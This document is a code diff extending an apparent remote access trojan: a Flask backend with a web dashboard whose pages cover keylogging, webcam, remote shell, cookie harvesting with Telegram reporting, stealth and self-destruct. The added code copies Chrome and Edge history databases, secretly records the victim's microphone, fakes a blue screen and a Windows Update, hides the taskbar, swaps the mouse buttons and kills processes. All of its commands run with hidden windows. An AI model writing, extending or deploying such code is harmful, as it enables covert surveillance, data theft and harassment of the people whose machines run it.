-            <button class="login-btn" onclick="attemptLogin()">ACCESS</button>
-            <div class="login-error" id="loginError">Invalid password</div>
+            <button class="login-btn" onclick="attemptLogin()">AUTHENTICATE</button>
+            <div class="login-error" id="loginError">Access denied</div>
         </div>
     </div>
 
@@ -1443,21 +1654,27 @@ DASHBOARD_HTML = r'''
         <!-- Sidebar -->
         <div class="sidebar" id="sidebar">
             <div class="sidebar-header">
-                <div class="sidebar-logo">[IGR]</div>
-                <button class="sidebar-toggle" onclick="toggleSidebar()">[&lt;&gt;]</button>
+                <div class="sidebar-logo">IGR</div>
+                <button class="sidebar-toggle" onclick="toggleSidebar()">&#9776;</button>
+            </div>
+            <div class="sidebar-status">
+                <div class="status-row"><div class="status-dot" id="connDot"></div><span id="connLabel">Connected</span></div>
+                <div class="status-row"><div class="status-dot"></div><span id="uptimeLabel">Uptime: 0m</span></div>
             </div>
             <div class="sidebar-nav">
-                <div class="nav-item active" onclick="showPage('home')"><span class="nav-icon">[H]</span><span class="nav-text">Home</span></div>
-                <div class="nav-item" onclick="showPage('screen')"><span class="nav-icon">[S]</span><span class="nav-text">Screen</span></div>
-                <div class="nav-item" onclick="showPage('webcam')"><span class="nav-icon">[W]</span><span class="nav-text">Webcam</span></div>
-                <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
-                <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">[K]</span><span class="nav-text">Keylogger</span></div>
-                <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">[F]</span><span class="nav-text">Files</span></div>
-                <div class="nav-item" onclick="showPage('shell')"><span class="nav-icon">[$]</span><span class="nav-text">Shell</span></div>
-                <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
-                <div class="nav-item" onclick="showPage('harvest')"><span class="nav-icon">[D]</span><span class="nav-text">Harvest</span></div>
-                <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
-                <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">[X]</span><span class="nav-text">Stealth</span></div>
+                <div class="nav-item active" onclick="showPage('home')"><span class="nav-icon">&#9751;</span><span class="nav-text">Home</span></div>
+                <div class="nav-item" onclick="showPage('screen')"><span class="nav-icon">&#9635;</span><span class="nav-text">Screen</span></div>
+                <div class="nav-item" onclick="showPage('webcam')"><span class="nav-icon">&#9673;</span><span class="nav-text">Webcam</span></div>
+                <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">&#9998;</span><span class="nav-text">Control</span></div>
+                <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">&#9997;</span><span class="nav-text">Keylogger</span></div>
+                <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">&#128193;</span><span class="nav-text">Files</span></div>
+                <div class="nav-item" onclick="showPage('shell')"><span class="nav-icon">&#9656;</span><span class="nav-text">Shell</span></div>
+                <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">&#9881;</span><span class="nav-text">Troll</span></div>
+                <div class="nav-item" onclick="showPage('harvest')"><span class="nav-icon">&#9775;</span><span class="nav-text">Harvest</span></div>
+                <div class="nav-item" onclick="showPage('system')"><span class="nav-icon">&#9881;</span><span class="nav-text">System</span></div>
+                <div class="nav-item" onclick="showPage('processes')"><span class="nav-icon">&#9776;</span><span class="nav-text">Processes</span></div>
+                <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">&#10148;</span><span class="nav-text">Remote</span></div>
+                <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">&#9733;</span><span class="nav-text">Stealth</span></div>
             </div>
         </div>
 
@@ -1465,6 +1682,10 @@ DASHBOARD_HTML = r'''
         <div class="main-content">
             <!-- Home Page -->
             <div class="page active" id="page-home">
+                <div class="command-bar">
+                    <input type="text" id="quickCmd" placeholder="Quick command... (press Enter to execute)" onkeypress="if(event.key==='Enter'){document.getElementById('commandInput').value=this.value;executeCommand();this.value='';}">
+                    <button class="btn small" onclick="exportActivityLog()">Export Log</button>
+                </div>
                 <div class="info-grid">
                     <div class="info-card"><div class="info-label">Host IP</div><div class="info-value" id="hostIp">Loading...</div></div>
                     <div class="info-card"><div class="info-label">Your IP</div><div class="info-value" id="clientIp">Loading...</div></div>
@@ -1603,10 +1824,27 @@ DASHBOARD_HTML = r'''
                     </div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Volume Control</div></div>
+                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="100" value="50" oninput="setVolume(this.value)">
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn small" onclick="setVolume(0)">Mute</button>
+                        <button class="btn small" onclick="setVolume(50)">50%</button>
+                        <button class="btn small" onclick="setVolume(100)">Max</button>
+                    </div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Mouse Jitter</div></div>
                     <div style="display: flex; gap: 10px;">
                         <button class="btn danger" onclick="startJitter()" style="flex: 1;">Start</button>
                         <button class="btn" onclick="stopJitter()" style="flex: 1;">Stop</button>
+                    </div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Mouse Tricks</div></div>
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <button class="btn" onclick="reverseMouse()" style="flex: 1;">Reverse Mouse</button>
+                        <button class="btn" onclick="swapMouseButtons()" style="flex: 1;">Swap Buttons</button>
+                        <button class="btn" onclick="restoreMouse()" style="flex: 1;">Restore</button>
                     </div>
                 </div>
                 <div class="section">
@@ -1624,14 +1862,45 @@ DASHBOARD_HTML = r'''
                     <button class="btn" onclick="changeWallpaper()" style="width: 100%;">Change</button>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Desktop</div></div>
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <button class="btn" onclick="hideDesktop()" style="flex: 1;">Hide Icons</button>
+                        <button class="btn" onclick="showDesktop()" style="flex: 1;">Show Icons</button>
+                    </div>
+                    <div style="display: flex; gap: 10px; margin-top: 8px; flex-wrap: wrap;">
+                        <button class="btn" onclick="hideTaskbar()" style="flex: 1;">Hide Taskbar</button>
+                        <button class="btn" onclick="showTaskbar()" style="flex: 1;">Show Taskbar</button>
+                    </div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Open URL</div></div>
+                    <input type="text" id="trollUrl" placeholder="https://...">
+                    <button class="btn" onclick="openTrollUrl()" style="width: 100%;">Open</button>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">CD Tray</div></div>
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn" onclick="ejectTray()" style="flex: 1;">Eject</button>
+                        <button class="btn" onclick="closeTray()" style="flex: 1;">Close</button>
+                    </div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Fake Screens</div></div>
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <button class="btn danger" onclick="fakeBSOD()" style="flex: 1;">Fake BSOD</button>
+                        <button class="btn danger" onclick="fakeWinUpdate()" style="flex: 1;">Fake Win Update</button>
+                    </div>
+                    <button class="btn" onclick="unfreezeScreen()" style="width: 100%; margin-top: 8px;">Dismiss</button>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Monitor</div></div>
                     <div style="display: flex; gap: 10px;">
                         <button class="btn danger" onclick="monitorOff()" style="flex: 1;">Turn Off</button>
                         <button class="btn" onclick="monitorOn()" style="flex: 1;">Turn On</button>
                     </div>
                 </div>
-                <div class="section" style="border-color: rgba(239, 68, 68, 0.3);">
-                    <div class="section-header"><div class="section-title" style="color: #ef4444;">Power</div></div>
+                <div class="section" style="border-color: rgba(255,68,102,0.2);">
+                    <div class="section-header"><div class="section-title" style="color: var(--red);">Power</div></div>
                     <div style="display: flex; gap: 10px;">
                         <button class="btn danger" onclick="rebootHost()" style="flex: 1;">Reboot</button>
                         <button class="btn danger" onclick="shutdownHost()" style="flex: 1;">Shutdown</button>
@@ -1660,6 +1929,10 @@ DASHBOARD_HTML = r'''
                     <div class="log-box" id="cookiesBox">Click Steal to extract browser cookies...</div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Browser History</div><button class="btn small" onclick="harvestHistory()">Dump</button></div>
+                    <div class="log-box" id="historyBox">Click Dump to extract browser history...</div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Installed Software</div><button class="btn small" onclick="harvestSoftware()">List</button></div>
                     <div class="log-box" id="softwareBox">Click List to get installed software...</div>
                 </div>
@@ -1672,10 +1945,53 @@ DASHBOARD_HTML = r'''
                     <div id="inventoryGrid" class="info-grid" style="display:none;"></div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Microphone Record</div><div><button class="btn small" onclick="startMicRecord()">Record</button><button class="btn small danger" onclick="stopMicRecord()">Stop</button></div></div>
+                    <div class="log-box" id="micBox">Click Record to capture microphone audio...</div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Send to Telegram</div></div>
                     <input type="text" id="telegramMsg" placeholder="Custom message or leave blank for auto-report">
                     <button class="btn" onclick="sendToTelegram()" style="width: 100%;">Send Report</button>
                 </div>
+                </div>
+            </div>
+
+            <!-- System Page -->
+            <div class="page" id="page-system">
+                <div class="page-grid">
+                <div class="section" style="grid-column: 1 / -1;">
+                    <div class="section-header"><div class="section-title">System Information</div><button class="btn small" onclick="harvestInventory()">Refresh</button></div>
+                    <div id="systemDetailGrid" class="info-grid"></div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Network Adapters</div><button class="btn small" onclick="getNetworkAdapters()">Scan</button></div>
+                    <div class="log-box" id="networkAdaptersBox">Click Scan to list network adapters...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Disk Drives</div><button class="btn small" onclick="getDiskDrives()">Scan</button></div>
+                    <div class="log-box" id="diskDrivesBox">Click Scan to list disk drives...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Startup Programs</div><button class="btn small" onclick="getStartupPrograms()">List</button></div>
+                    <div class="log-box" id="startupBox">Click List to see startup programs...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Scheduled Tasks</div><button class="btn small" onclick="getScheduledTasks()">List</button></div>
+                    <div class="log-box" id="tasksBox">Click List to see scheduled tasks...</div>
+                </div>
+                </div>
+            </div>
+
+            <!-- Processes Page -->
+            <div class="page" id="page-processes">
+                <div class="section" style="flex: 1;">
+                    <div class="section-header"><div class="section-title">Running Processes</div><div><button class="btn small" onclick="listProcesses()">Refresh</button><input type="text" id="procFilter" placeholder="Filter..." style="width: 200px; margin-bottom: 0;" oninput="filterProcesses()"></div></div>
+                    <div style="overflow-y: auto; flex: 1;">
+                        <table class="proc-table">
+                            <thead><tr><th>PID</th><th>Name</th><th>Memory</th><th>CPU</th><th>Action</th></tr></thead>
+                            <tbody id="procTableBody"></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
@@ -2311,6 +2627,179 @@ DASHBOARD_HTML = r'''
                 alert(data.success ? 'Self-destruct initiated. Connection will be lost.' : 'Partial: ' + (data.status || 'some items failed'));
             }).catch(() => {});
             logActivity('PANIC - Self destruct initiated');
+        }
+
+        // ===== NEW FEATURES =====
+        let _startTime = Date.now();
+        setInterval(() => {
+            const m = Math.floor((Date.now() - _startTime) / 60000);
+            document.getElementById('uptimeLabel').textContent = `Uptime: ${m}m`;
+        }, 30000);
+
+        function exportActivityLog() {
+            const log = document.getElementById('activityLog').textContent;
+            const blob = new Blob([log], {type: 'text/plain'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'igr_activity_log.txt';
+            a.click();
+            logActivity('Activity log exported');
+        }
+
+        // Troll - Volume
+        async function setVolume(vol) {
+            await fetch('/api/troll/volume', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({volume: parseInt(vol)})});
+            logActivity('Volume set to ' + vol + '%');
+        }
+
+        // Troll - Reverse Mouse
+        async function reverseMouse() {
+            await fetch('/api/troll/reverse_mouse', {method:'POST'});
+            logActivity('Mouse reversed');
+        }
+
+        // Troll - Swap Mouse Buttons
+        async function swapMouseButtons() {
+            await fetch('/api/troll/swap_buttons', {method:'POST'});
+            logActivity('Mouse buttons swapped');
+        }
+
+        // Troll - Restore Mouse
+        async function restoreMouse() {
+            await fetch('/api/troll/restore_mouse', {method:'POST'});
+            logActivity('Mouse restored');
+        }
+
+        // Troll - Hide/Show Desktop
+        async function hideDesktop() {
+            await fetch('/api/troll/desktop', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'hide'})});
+            logActivity('Desktop icons hidden');
+        }
+        async function showDesktop() {
+            await fetch('/api/troll/desktop', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'show'})});
+            logActivity('Desktop icons shown');
+        }
+
+        // Troll - Hide/Show Taskbar
+        async function hideTaskbar() {
+            await fetch('/api/troll/taskbar', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'hide'})});
+            logActivity('Taskbar hidden');
+        }
+        async function showTaskbar() {
+            await fetch('/api/troll/taskbar', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'show'})});
+            logActivity('Taskbar shown');
+        }
+
+        // Troll - Open URL
+        async function openTrollUrl() {
+            const url = document.getElementById('trollUrl').value;
+            if (!url) { logActivity('No URL'); return; }
+            await fetch('/api/remote/browser_open', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url})});
+            logActivity('Opened URL: ' + url);
+        }
+
+        // Troll - Eject/Close CD Tray
+        async function ejectTray() {
+            await fetch('/api/troll/cdtray', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'eject'})});
+            logActivity('CD tray ejected');
+        }
+        async function closeTray() {
+            await fetch('/api/troll/cdtray', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'close'})});
+            logActivity('CD tray closed');
+        }
+
+        // Troll - Fake BSOD
+        async function fakeBSOD() {
+            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'bsod'})});
+            logActivity('Fake BSOD triggered');
+        }
+
+        // Troll - Fake Windows Update
+        async function fakeWinUpdate() {
+            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'winupdate'})});
+            logActivity('Fake Windows Update triggered');
+        }
+
+        // Harvest - Browser History
+        async function harvestHistory() {
+            document.getElementById('historyBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/browser_history');
+            const data = await res.json();
+            document.getElementById('historyBox').textContent = data.history ? data.history.join('\n') : 'None found';
+            logActivity('Browser history dumped');
+        }
+
+        // Harvest - Mic Record
+        async function startMicRecord() {
+            await fetch('/api/harvest/mic_record', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'start'})});
+            document.getElementById('micBox').textContent = 'Recording...';
+            logActivity('Microphone recording started');
+        }
+        async function stopMicRecord() {
+            const res = await fetch('/api/harvest/mic_record', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'stop'})});
+            const data = await res.json();
+            if (data.file) {
+                document.getElementById('micBox').textContent = 'Recording saved. Download...';
+                window.location.href = data.file;
+            } else {
+                document.getElementById('micBox').textContent = 'No recording available';
+            }
+            logActivity('Microphone recording stopped');
+        }
+
+        // System Page
+        async function getNetworkAdapters() {
+            document.getElementById('networkAdaptersBox').textContent = 'Scanning...';
+            const res = await fetch('/api/system/network_adapters');
+            const data = await res.json();
+            document.getElementById('networkAdaptersBox').textContent = data.adapters ? data.adapters.join('\n') : 'None found';
+        }
+        async function getDiskDrives() {
+            document.getElementById('diskDrivesBox').textContent = 'Scanning...';
+            const res = await fetch('/api/system/disk_drives');
+            const data = await res.json();
+            document.getElementById('diskDrivesBox').textContent = data.drives ? data.drives.join('\n') : 'None found';
+        }
+        async function getStartupPrograms() {
+            document.getElementById('startupBox').textContent = 'Listing...';
+            const res = await fetch('/api/system/startup_programs');
+            const data = await res.json();
+            document.getElementById('startupBox').textContent = data.programs ? data.programs.join('\n') : 'None found';
+        }
+        async function getScheduledTasks() {
+            document.getElementById('tasksBox').textContent = 'Listing...';
+            const res = await fetch('/api/system/scheduled_tasks');
+            const data = await res.json();
+            document.getElementById('tasksBox').textContent = data.tasks ? data.tasks.join('\n') : 'None found';
+        }
+
+        // Processes Page
+        let _allProcesses = [];
+        async function listProcesses() {
+            const res = await fetch('/api/system/processes');
+            const data = await res.json();
+            _allProcesses = data.processes || [];
+            renderProcesses(_allProcesses);
+            logActivity('Process list refreshed');
+        }
+        function renderProcesses(procs) {
+            const tbody = document.getElementById('procTableBody');
+            tbody.innerHTML = '';
+            procs.forEach(p => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `<td>${p.pid}</td><td>${p.name}</td><td>${p.memory || '-'}</td><td>${p.cpu || '-'}</td><td><button class="btn small danger" onclick="killProcessByPid(${p.pid})">Kill</button></td>`;
+                tbody.appendChild(tr);
+            });
+        }
+        function filterProcesses() {
+            const f = document.getElementById('procFilter').value.toLowerCase();
+            const filtered = _allProcesses.filter(p => p.name.toLowerCase().includes(f) || String(p.pid).includes(f));
+            renderProcesses(filtered);
+        }
+        async function killProcessByPid(pid) {
+            await fetch('/api/system/process_kill_pid', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({pid})});
+            logActivity('Killed PID ' + pid);
+            listProcesses();
         }
     </script>
 </body>
@@ -3394,6 +3883,267 @@ def troll_shutdown():
     try:
         subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'Windows Update'], creationflags=0x08000000)
         return jsonify({'success': True, 'status': 'Shutting down in 5 seconds'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/volume', methods=['POST'])
+def troll_volume():
+    """Set system volume 0-100."""
+    try:
+        data = request.get_json()
+        vol = max(0, min(100, int(data.get('volume', 50))))
+        subprocess.run(['powershell', '-Command',
+            f'$wshShell = New-Object -ComObject WScript.Shell; 1..50 | % {{$wshShell.SendKeys([char]174)}}; 1..{vol // 2} | % {{$wshShell.SendKeys([char]175)}}'],
+            capture_output=True, timeout=15, creationflags=0x08000000)
+        return jsonify({'success': True, 'volume': vol})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/reverse_mouse', methods=['POST'])
+def troll_reverse_mouse():
+    """Reverse mouse direction via registry."""
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "MouseSpeed", 0, winreg.REG_SZ, "0")
+        winreg.SetValueEx(key, "MouseThreshold1", 0, winreg.REG_SZ, "0")
+        winreg.SetValueEx(key, "MouseThreshold2", 0, winreg.REG_SZ, "0")
+        winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "0")
+        winreg.CloseKey(key)
+        subprocess.run(['powershell', '-Command',
+            'Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class M{{[DllImport(\\"user32.dll\\")]public static extern bool SystemParametersInfo(int a,int b,string c,int d);}}";[M]::SystemParametersInfo(0x0015,0,"0",3)'],
+            capture_output=True, timeout=10, creationflags=0x08000000)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/swap_buttons', methods=['POST'])
+def troll_swap_buttons():
+    """Swap left/right mouse buttons."""
+    try:
+        import ctypes
+        ctypes.windll.user32.SwapMouseButton(True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/restore_mouse', methods=['POST'])
+def troll_restore_mouse():
+    """Restore mouse to normal."""
+    try:
+        import ctypes, winreg
+        ctypes.windll.user32.SwapMouseButton(False)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "MouseSpeed", 0, winreg.REG_SZ, "1")
+        winreg.SetValueEx(key, "MouseThreshold1", 0, winreg.REG_SZ, "6")
+        winreg.SetValueEx(key, "MouseThreshold2", 0, winreg.REG_SZ, "10")
+        winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "0")
+        winreg.CloseKey(key)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/desktop', methods=['POST'])
+def troll_desktop():
+    """Hide or show desktop icons."""
+    try:
+        data = request.get_json()
+        action = data.get('action', 'show')
+        import ctypes
+        hwnd = ctypes.windll.user32.FindWindowW(None, "Program Manager")
+        if action == 'hide':
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+        else:
+            ctypes.windll.user32.ShowWindow(hwnd, 1)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/taskbar', methods=['POST'])
+def troll_taskbar():
+    """Hide or show taskbar."""
+    try:
+        data = request.get_json()
+        action = data.get('action', 'show')
+        import ctypes
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        if action == 'hide':
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+            hwnd2 = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
+            if hwnd2:
+                ctypes.windll.user32.ShowWindow(hwnd2, 0)
+        else:
+            ctypes.windll.user32.ShowWindow(hwnd, 1)
+            hwnd2 = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
+            if hwnd2:
+                ctypes.windll.user32.ShowWindow(hwnd2, 1)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/cdtray', methods=['POST'])
+def troll_cdtray():
+    """Eject or close CD tray."""
+    try:
+        data = request.get_json()
+        action = data.get('action', 'eject')
+        cmd = f'$cd = New-Object -ComObject WMPlayer.OCX; $cd.controls.{("play" if action == "eject" else "stop")}()'
+        subprocess.run(['powershell', '-Command',
+            f'(New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject()' if action == 'eject' else
+            f'(New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject()'],
+            capture_output=True, timeout=10, creationflags=0x08000000)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/fake_screen', methods=['POST'])
+def troll_fake_screen():
+    """Show fake BSOD or Windows Update overlay."""
+    try:
+        data = request.get_json()
+        fake_type = data.get('type', 'bsod')
+        if fake_type == 'bsod':
+            html = '<html><body style="background:#0078D7;color:white;font-family:Segoe UI;margin:0;padding:60px 80px;"><div style="font-size:120px;">:(</div><br><div style="font-size:24px;">Your PC ran into a problem and needs to restart.</div><br><div style="font-size:18px;">Stop code: CRITICAL_PROCESS_DIED</div><br><div style="font-size:16px;">Collecting error info... 0% complete</div></body></html>'
+        else:
+            html = '<html><body style="background:#000;color:white;font-family:Segoe UI;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;"><div style="font-size:28px;">Working on updates</div><div style="font-size:18px;margin-top:20px;">Don\'t turn off your PC. This will take a while.</div><div style="font-size:48px;margin-top:40px;">0%</div><div style="width:400px;height:4px;background:#333;margin-top:20px;border-radius:2px;"><div style="width:0%;height:100%;background:#0078D7;border-radius:2px;"></div></div></body></html>'
+        tmp_html = os.path.join(KEYLOG_DIR, "_fake_screen.html")
+        with open(tmp_html, 'w') as f:
+            f.write(html)
+        subprocess.run(['mshta.exe', tmp_html], creationflags=0x08000000, close_fds=True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/browser_history', methods=['GET'])
+def harvest_browser_history():
+    """Extract browser history from Chrome/Edge."""
+    try:
+        results = []
+        for browser_name, profile_path in [
+            ("Chrome", os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')),
+            ("Edge", os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History'))
+        ]:
+            if not os.path.exists(profile_path):
+                continue
+            try:
+                import shutil, sqlite3
+                tmp_db = os.path.join(KEYLOG_DIR, f"_tmp_history_{browser_name}.db")
+                shutil.copy2(profile_path, tmp_db)
+                conn = sqlite3.connect(tmp_db)
+                cursor = conn.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                for row in cursor:
+                    results.append(f"[{browser_name}] {row[1] or 'No Title'} - {row[0]}")
+                conn.close()
+                os.remove(tmp_db)
+            except:
+                pass
+        return jsonify({'history': results if results else ['No history found']})
+    except Exception as e:
+        return jsonify({'history': ['Error: ' + str(e)]})
+
+_mic_recording_proc = None
+
+@app.route('/api/harvest/mic_record', methods=['POST'])
+def harvest_mic_record():
+    """Record microphone audio."""
+    global _mic_recording_proc
+    try:
+        data = request.get_json()
+        action = data.get('action', 'start')
+        if action == 'start':
+            tmp_wav = os.path.join(KEYLOG_DIR, "_mic_recording.wav")
+            try:
+                os.remove(tmp_wav)
+            except:
+                pass
+            _mic_recording_proc = subprocess.Popen(
+                ['powershell', '-Command',
+                 f'$rec = New-Object System.Media.SoundRecorder; $rec.Record("{tmp_wav}")'],
+                creationflags=0x08000000, close_fds=True)
+            return jsonify({'success': True, 'status': 'Recording started'})
+        else:
+            if _mic_recording_proc:
+                _mic_recording_proc.terminate()
+                _mic_recording_proc = None
+            tmp_wav = os.path.join(KEYLOG_DIR, "_mic_recording.wav")
+            if os.path.exists(tmp_wav):
+                return jsonify({'success': True, 'file': f'/api/files/download?path={tmp_wav}'})
+            return jsonify({'success': False, 'error': 'No recording file'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/system/network_adapters', methods=['GET'])
+def system_network_adapters():
+    """List network adapters."""
+    try:
+        result = subprocess.run(['powershell', '-Command',
+            'Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, LinkSpeed | Format-Table -HideTableHeaders'],
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+        adapters = [l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
+        return jsonify({'adapters': adapters if adapters else ['No adapters found']})
+    except Exception as e:
+        return jsonify({'adapters': ['Error: ' + str(e)]})
+
+@app.route('/api/system/disk_drives', methods=['GET'])
+def system_disk_drives():
+    """List disk drives."""
+    try:
+        result = subprocess.run(['powershell', '-Command',
+            'Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, DriveType, Size, FreeSpace | ForEach-Object { "$($_.DeviceID) Type=$($_.DriveType) Total=$([math]::Round($_.Size/1GB,1))GB Free=$([math]::Round($_.FreeSpace/1GB,1))GB" }'],
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+        drives = [l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
+        return jsonify({'drives': drives if drives else ['No drives found']})
+    except Exception as e:
+        return jsonify({'drives': ['Error: ' + str(e)]})
+
+@app.route('/api/system/startup_programs', methods=['GET'])
+def system_startup_programs():
+    """List startup programs."""
+    try:
+        result = subprocess.run(['powershell', '-Command',
+            'Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-List'],
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+        programs = [l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
+        return jsonify({'programs': programs if programs else ['No startup programs found']})
+    except Exception as e:
+        return jsonify({'programs': ['Error: ' + str(e)]})
+
+@app.route('/api/system/scheduled_tasks', methods=['GET'])
+def system_scheduled_tasks():
+    """List scheduled tasks."""
+    try:
+        result = subprocess.run(['powershell', '-Command',
+            'Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, State | Format-Table -HideTableHeaders'],
+            capture_output=True, text=True, timeout=20, creationflags=0x08000000)
+        tasks = [l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
+        return jsonify({'tasks': tasks[:200] if tasks else ['No tasks found']})
+    except Exception as e:
+        return jsonify({'tasks': ['Error: ' + str(e)]})
+
+@app.route('/api/system/processes', methods=['GET'])
+def system_processes():
+    """List running processes."""
+    try:
+        result = subprocess.run(['powershell', '-Command',
+            'Get-Process | Select-Object Id, ProcessName, @{N="Mem(MB)";E={[math]::Round($_.WorkingSet64/1MB,1)}}, CPU | ConvertTo-Json -Compress'],
+            capture_output=True, text=True, timeout=20, creationflags=0x08000000)
+        import json
+        procs = json.loads(result.stdout) if result.stdout.strip() else []
+        if isinstance(procs, dict):
+            procs = [procs]
+        processes = [{'pid': p.get('Id', 0), 'name': p.get('ProcessName', '?'), 'memory': str(p.get('Mem(MB)', '-')) + 'MB', 'cpu': str(round(p.get('CPU', 0) or 0, 1))} for p in procs]
+        return jsonify({'processes': processes})
+    except Exception as e:
+        return jsonify({'processes': []})
+
+@app.route('/api/system/process_kill_pid', methods=['POST'])
+def system_process_kill_pid():
+    """Kill process by PID."""
+    try:
+        data = request.get_json()
+        pid = int(data.get('pid', 0))
+        subprocess.run(['taskkill', '/pid', str(pid), '/f'], creationflags=0x08000000, capture_output=True)
+        return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
